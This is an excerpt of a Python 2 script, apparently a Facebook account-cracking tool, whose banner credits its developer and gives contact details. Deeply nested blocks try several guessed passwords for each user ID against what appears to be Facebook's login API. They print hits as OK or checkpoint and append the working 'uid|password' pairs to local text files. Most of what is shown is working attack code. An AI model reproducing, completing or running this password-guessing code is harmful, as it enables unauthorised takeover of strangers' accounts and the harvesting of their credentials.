...
#!/usr/bin/python2
#coding=utf-8
#originally written by (UZAIR KHAN)
try:
...
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
\033[1;93m-----------------------------------------------------
 \033[1;93m(*)\033[1;92m Developer: (UZAIR KHAN)
 \033[1;93m(*)\033[1;92m WhatsApp :   03013025428
 \033[1;93m(*)\033[1;92m Github   : https://github.com/
\033[1;93m-----------------------------------------------------
"""
def tool():
	os.system("clear")
...
def crack_select():
	...
	if select =="1":
		...
		try:
			...
			print(logo)
			print('')
			print("  🔥UZAIR-KHAN🔥 START CRACKING.....")
			print('')
	...
	def main(arg):
		...
		try:
			...
			q = json.loads(data)
			if "access_token" in q:
				print(" \033[1;32m [UZAIR-KHAN-OK] "+uid+" | "+pass1+"\033[0;97m")
				...
				if "www.facebook.com" in q["error_msg"]:
					print(" \033[1;33m [UZAIR-KHAN-CP] "+uid+" | "+pass1+"\033[0;97m")
					...
					q = json.loads(data)
					if "access_token" in q:
						print(" \033[1;32m [UZAIR-KHAN-OK] "+uid+" | "+pass2+"\033[0;97m")
						ok = open("SYED-ZADAok.txt", "a")
						ok.write(uid+"|"+pass2+"\n")
						ok.close()
						...
						if "www.facebook.com" in q["error_msg"]:
							print(" \033[1;33m [UZAIR-KHAN-CP] "+uid+" | "+pass2+"\033[0;97m")
							cp = open("SYED-ZADAcp.txt", "a")
							cp.write(uid+"|"+pass2+"\n")
							cp.close()
							...
							q = json.loads(data)
							if "access_token" in q:
								print(" \033[1;32m [UZAIR-KHAN-OK] "+uid+" | "+pass3+"\033[0;97m")
								ok = open("SYED-ZADAok.txt", "a")
								ok.write(uid+"|"+pass3+"\n")
								ok.close()
								...
								if "www.facebook.com" in q["error_msg"]:
									print(" \033[1;33m [UZAIR-KHAN-CP] "+uid+" | "+pass3+"\033[0;97m")
									cp = open("SYED-ZADAcp.txt", "a")
									cp.write(uid+"|"+pass3+"\n")
									cp.close()
									...
									q = json.loads(data)
									if "access_token" in q:
										print(" \033[1;32m [UZAIR-KHAN-OK] "+uid+" | "+pass4+"\033[0;97m")
										ok = open("SYED-ZADAok.txt", "a")
										ok.write(uid+"|"+pass4+"\n")
										ok.close()
										...
										if "www.facebook.com" in q["error_msg"]:
											print(" \033[1;33m [UZAIR-KHAN-CP] "+uid+" | "+pass4+"\033[0;97m")
											cp = open("SYED-ZADAcp.txt", "a")
											cp.write(uid+"|"+pass4+"\n")
											cp.close()
											...
											q = json.loads(data)
											if "access_token" in q:
												print(" \033[1;32m [UZAIR-KHAN-OK] "+uid+" | "+pass5+"\033[0;97m")
												ok = open("SYED-ZADAok.txt", "a")
												ok.write(uid+"|"+pass5+"\n")
												ok.close()
												...
												if "www.facebook.com" in q["error_msg"]:
													print(" \033[1;33m [UZAIR-KHAN-CP] "+uid+" | "+pass5+"\033[0;97m")
													cp = open("SYED-ZADAcp.txt", "a")
													cp.write(uid+"|"+pass5+"\n")
													cp.close()
													...
													q = json.loads(data)
													if "access_token" in q:
														print(" \033[1;32m [UZAIR-KHAN-OK] "+uid+" | "+pass6+"\033[0;97m")
														ok = open("SYED-ZADAok.txt", "a")
														ok.write(uid+"|"+pass6+"\n")
														ok.close()
														...
														if "www.facebook.com" in q["error_msg"]:
															print(" \033[1;33m [UZAIR-KHAN-CP] "+uid+" | "+pass6+"\033[0;97m")
															cp = open("SYED-ZADAcp.txt", "a")
															cp.write(uid+"|"+pass6+"\n")
															cp.close()
															...
															q = json.loads(data)
															if "access_token" in q:
																print(" \033[1;32m [UZAIR-KHAN-OK] "+uid+" | "+pass7+"\033[0;97m")
																ok = open("SYED-ZADAok.txt", "a")
																ok.write(uid+"|"+pass7+"\n")
																ok.close()
																...
																if "www.facebook.com" in q["error_msg"]:
																	print(" \033[1;33m [UZAIR-KHAN-CP] "+uid+" | "+pass7+"\033[0;97m")
																	cp = open("SYED-ZADAcp.txt", "a")
																	cp.write(uid+"|"+pass7+"\n")
																	cp.close()
				...
				if "www.facebook.com" in q["error_msg"]:
					...
					if "access_token" in q:
						...
						if "www.facebook.com" in q["error_msg"]:
							...
							q = json.loads(data)
							if "access_token" in q:
								print(" \033[1;32m [UZAIR-AFRIDI-OK] "+uid+" | "+pass3+"\033[0;97m")
								ok = open("SYED-ZADAok.txt", "a")
								ok.write(uid+"|"+pass3+"\n")
								ok.close()
								oks.append(uid+pass3)
								...
								if "www.facebook.com" in q["error_msg"]:
									print(" \033[1;33m [UZAIR-AFRIDI-CP] "+uid+" | "+pass3+"\033[0;97m")
									cp = open("SYED-ZADAcp.txt", "a")
									cp.write(uid+"|"+pass3+"\n")
									cp.close()
									cps.append(uid+pass3)
											...
											if "access_token" in q:
												...
												if "www.facebook.com" in q["error_msg"]:
													...
													if "access_token" in q:
														...
														if "www.facebook.com" in q["error_msg"]:
															print(" \033[1;28m [UZAIR-KHAN-CP] "+uid+" | "+pass6+"\033[0;97m")
															cp = open("SYED-ZADAcp.txt", "a")
															cp.write(uid+"|"+pass6+"\n")
															cp.close()
															cps.append(uid+pass6)
